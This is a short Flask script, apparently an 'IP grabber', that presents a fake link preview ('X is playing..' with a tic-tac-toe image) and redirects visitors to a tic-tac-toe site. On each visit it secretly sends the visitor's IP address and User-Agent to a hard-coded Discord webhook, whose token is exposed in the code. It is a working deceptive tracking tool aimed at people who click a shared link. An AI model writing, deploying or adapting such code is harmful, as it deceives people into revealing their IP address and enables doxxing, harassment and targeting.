from flask import Flask, request, redirect, Response
import requests

app = Flask(__name__)

WEBHOOK = "https://discord.com/api/webhooks/1477677023873994893/iBRH5ZyyQBARJvFJV5AYFFGoTL-sw3vTW9iCZnmZxFG2mZDiw60xEmk2Rdtdqjh_RFuB"
TARGET = "https://playtictactoe.org"
PREVIEW_IMAGE = "https://raw.githubusercontent.com/vn4thyt/vnsyt/refs/heads/main/Stuff/Image%20Grabber/tictactoe.png"

@app.route("/")
def grab():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent")

    requests.post(WEBHOOK, json={
        "content": f"GRABBED! | IP: {ip}\nUA: {ua}"
    })

    html = f"""
    <html>
      <head>
        <meta property="og:title" content="X is playing..">
        <meta property="og:image" content="{PREVIEW_IMAGE}">
        <meta http-equiv="refresh" content="0; url={TARGET}">
      </head>
      <body></body>
    </html>
    """
    return Response(html, mimetype="text/html")

if __name__ == "__main__":
    app.run()
